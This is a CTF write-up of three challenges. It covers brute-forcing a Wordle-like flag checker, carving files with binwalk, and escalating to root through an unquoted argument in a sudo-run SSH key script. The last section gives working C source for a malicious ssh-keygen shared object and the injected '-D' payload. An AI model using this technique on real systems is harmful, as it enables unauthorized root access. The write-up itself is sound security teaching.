# misc

## Flagdle
> Solved by thewhiteh4t


![](https://i.imgur.com/PQRJN6b.png)


In this challenge we were supposed to guess the flag. Like in the game wordle the application highlights which character of the flag are on the correct position and which are not along with incorrect characters.

Here is the response of the example flag in the image above : 


![](https://i.imgur.com/u1Nhikd.png)


To guess and extract the entire flag we can automate the process using python : 


    #! /usr/bin/env python3
    
    import json
    import string
    import requests
    
    url = 'http://challenge.nahamcon.com:30129/guess'
    
    charset = []
    charset.extend(list(string.ascii_lowercase))
    charset.extend(list(string.digits))
    
    flag_chars = ['a' for i in range(32)]
    
    flag = 'flag{' + "".join(flag_chars) + '}'
    
    payload = {
            'guess': flag
    }
    
    rqst = requests.post(url, json=payload)
    
    if rqst.status_code == 200:
            output = list(json.loads(rqst.text)['result'])
            emo_id = 0
            for emoji in output:
                    if emoji != '🟩':
                            for char in charset:
                                    flag_chars[emo_id] = char
                                    flag = 'flag{' + "".join(flag_chars) + '}'
                                    payload = {
                                            'guess': flag
                                    }
                                    sub_rqst = requests.post(url, json=payload)
                                    sub_output = list(json.loads(sub_rqst.text)['result'])
                                    if sub_output[emo_id] == '🟩':
                                            flag = 'flag{' + "".join(flag_chars) + '}'
                                            print(flag)
                                            break
                    emo_id += 1
    else:
            print('Status :', rqst.status_code)
            print('Error  :', rqst.text)
    

This script can be improved in multiple ways to cut down the time and complexity and possibly reduce number of requests sent to the server, but I used the longer method because it's a security CTF and not a coding competition 🙂 

Below you can see the flag gets populated with correct characters on each position. I started with a simple 32 times a flag.


![](https://i.imgur.com/yGBkrnj.png)


**Key Learning and Takeaways**


- Automation : This is exactly the kind of repetitive, pattern-based task where scripting is useful. Trying to guess character by character, position by position, by hand would take forever.
- Leveraging Feedback Loops : We used the game's own feedback against it. Every time we sent a guess, we got information. In real world many business logic bugs can be exploited in similar manner.


----------


## The Martian
> Solved by thewhiteh4t

In this challenge we get a binary file. Running `file` command did not help because magic bytes of header and footer were corrupt. So I tried to use `hexdump -C` command to check its contents and magic bytes. At the time of solving idea was that most probably multiple files were concatenated into one file, so I used `binwalk` to extract available files :


    binwalk -e challenge.martian


![](https://i.imgur.com/x92plLw.png)


So binwalk found multiple `bzip` archives and extracted them in one go, in the next image we can see the extracted directories and inside one of the directories we get a `decompressed.bin`, this is the default naming convention of binwalk so to find actual type of the file we can again use `file` command, and we can see that it's a `JPEG` image


![](https://i.imgur.com/7CIe5IO.png)


So I renamed the file and opened it in a gallery viewer : 


![](https://i.imgur.com/liCEDQ3.jpeg)


**Key Learning and Takeaways**


- Tools complexity : Our first instinct is always using the `file` command, but when it did not work we switched to `hexdump`, letting us inspect raw bytes of the file. You start looking for patterns, weird sequences, or signs of something that should be there but isn't.
- The "Concatenated Files" : Seeing weird junk in `hexdump` often means one thing, you've got multiple files or the given file might be corrupt. This was our big guess, and it's a super common CTF trick.
- Enter binwalk : It's an incredible tool for exactly this scenario. It scans a file, looking for known file "signatures" (those magic bytes we talked about) and extracts them.  Another similar tool is `foremost`.


----------


## SSSH
> Solved by thewhiteh4t

In this challenge we were given SSH access to an instance which contained a custom bash script which is a SSH key manager script. Running `sudo -l` reveals that our user can run the script as root without a password. This was a privilege escalation challenge.


![](https://i.imgur.com/ZToHz2J.png)


Luckily the code of the script was readable. After reading it for some time one block looked interesting : 


    comment=$(gum input --placeholder "Enter comment for key (optional)" --prompt "Comment: ")
    
        if ! is_valid_input "$comment"; then
            gum style --foreground "$ERROR_FG" --border-foreground "$ERROR_BORDER_FG" --border double --align center --width "$BOX_WIDTH" --margin "$BOX_MARGIN" --padding "$BOX_PADDING" "Invalid comment: Dangerous characters"
            return 1
        fi
    
        if [ -f ~/.ssh/"$key_name" ] || [ -f ~/.ssh/"$key_name.pub" ]; then
            if ! gum confirm "Key ~/.ssh/$key_name already exists. Overwrite?"; then
                return
            fi
            overwrite_flag="-y"
        else
            overwrite_flag=""
        fi
    
        mkdir -p ~/.ssh
        chmod 700 ~/.ssh
    
        if [ -n "$comment" ]; then
            error_output=$(gum spin --spinner dot --title "Generating key in ~/.ssh..." -- \
                ssh-keygen $overwrite_flag -C $comment -t $key_type -f ~/.ssh/"$key_name" -N "$passphrase" 2>&1)
        else
            error_output=$(gum spin --spinner dot --title "Generating key in ~/.ssh..." -- \
                ssh-keygen $overwrite_flag -t $key_type -f ~/.ssh/"$key_name" -N "$passphrase" 2>&1)
        fi

As you must have noticed all the inputs are quoted except one : 


    ssh-keygen $overwrite_flag -C $comment -t $key_type -f ~/.ssh/"$key_name" -N "$passphrase" 2>&1)

`$comment` is left unquoted so we can inject something here.

After a lot of hit and trials I finally realized that `ssh-keygen` offers a privesc vector. You can find more about it here :

[GTFOBins](https://gtfobins.github.io/gtfobins/ssh-keygen/)

Since we can have control over comment argument option we can simply add more arguments, specifically `-D` so that we can execute our malicious shared object `.so` file.

But first I had to figure out how to create a malicious shared object file for ssh-keygen. My search led me to a fork of [lib2shell](https://github.com/jonasheschl/lib2shell-ssh-keygen/blob/master/unix/lib2shell.c) which does exactly what I need. So I used the following code to compile the so file : 


    #include <stdio.h>
    #include <unistd.h>
    
    #define SHELL_PATH "/bin/sh"
    
    void __attribute__ ((constructor)) constructor() {
        puts("[lib2shell by SeanP, modified by Jonas Heschl]");
    
        long long err = execl(SHELL_PATH, SHELL_PATH, "cp /root/flag.txt /home/user/flag.txt; chown user:user /home/user/flag.txt", NULL);
        printf("Result: %lld\n", err);
    }
    
    // ssh-keygen makes a rudimentary check when loading a library with `ssh-keygen -D`.
    // If the check fails, loading is aborted. This function exists to make the check pass.
    int C_GetFunctionList() {
        return 1;
    }

Compiled it using : 


    gcc -fPIC -shared -o twh.so twh.c

and here is the value of comment I used :


    a -D ./twh.so

First I managed to copy the flag from `/root/flag.txt` to `/home/user/flag.txt` but I did not get the flag!


![](https://i.imgur.com/JGHdgr9.png)


So now the goal was to obtain a root shell. The problem was that a simple payload like `/bin/bash -s` was not working since the script uses `gum` which is a kind of wrapper that is used to create the TUI of the script, so the shell spawn was not usable due to messed up input output redirection.

Then I eventually landed on a fix for redirection, alternatively we can also use the bash reverse shell which most are familiar with


    #include <stdio.h>
    #include <unistd.h>
    
    #define SHELL_PATH "/bin/sh"
    
    void __attribute__ ((constructor)) constructor() {
        puts("[lib2shell by SeanP, modified by Jonas Heschl]");
    
        long long err = execl("/bin/bash", "bash", "-c", "bash < /dev/tty > /dev/tty 2>&1 &", NULL);
        printf("Result: %lld\n", err);
    }
    
    int C_GetFunctionList() {
        return 1;
    }

Using the new so file I managed to get a root shell.


![](https://i.imgur.com/xrcbmXv.png)


Then I saw why I did not get flag earlier, because we were supposed to run a binary to get the flag, this was done to increase the complexity of the challenge a bit.


![](https://i.imgur.com/lnlmWcA.png)


**Key Learning and Takeaways**


- Code Review : We had the script's code, which is a blessing in CTFs. The key was to read through it slowly while understanding what each line is doing.
- GTFOBins : When you find a command that can be run as root, your next stop should be GTFOBins. It's an incredible resource that lists known ways to abuse common binaries for privilege escalation.
- Crafting the Malicious Shared Object : This was the truly technical part! We needed a specific .so file that would execute a shell for us when loaded. Finding and adapting a lib2shell fork was fun.

